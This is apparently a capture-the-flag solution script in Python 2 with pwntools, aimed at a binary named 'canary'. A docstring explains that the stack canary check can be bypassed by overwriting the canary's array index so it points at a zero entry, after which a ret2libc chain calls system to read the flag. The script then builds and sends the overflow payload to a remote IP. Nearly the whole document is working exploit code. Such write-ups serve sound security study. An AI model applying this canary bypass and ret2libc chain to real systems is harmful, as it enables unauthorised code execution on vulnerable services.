"""
There is a canary which we need to bypass to abuse BoF.
I noticed that we can modify the value of canary which they compare with.
there is a variable on the stack which contains the index of canary (our canary is an array).
and canary[0] contain a value which is impossible to bypass unless bruteforce
but canary[1] contain 0x0000000.

We chain our exploit with ret2libc and we can flag it after all.

Buffer :
[JUNK][CANARY_OF_OUR_FRAME][CANARY_INDEX][JUNK][SYSTEM][EXIT][ADDR of /bin/cat ./flag]

"""


from pwn import *

r=remote('18.222.227.1', 12345)

e = ELF('./canary')

print r.recv(200)

payload = fit({ 40:p32(0),
		44:p32(1),
		56:e.plt.system,
		60:e.plt.exit,
		64:p32(0x080488a9)
		},
		filler="A",
)

print (hexdump(payload))
r.sendline(payload)
print r.recvline()
print r.recvline()
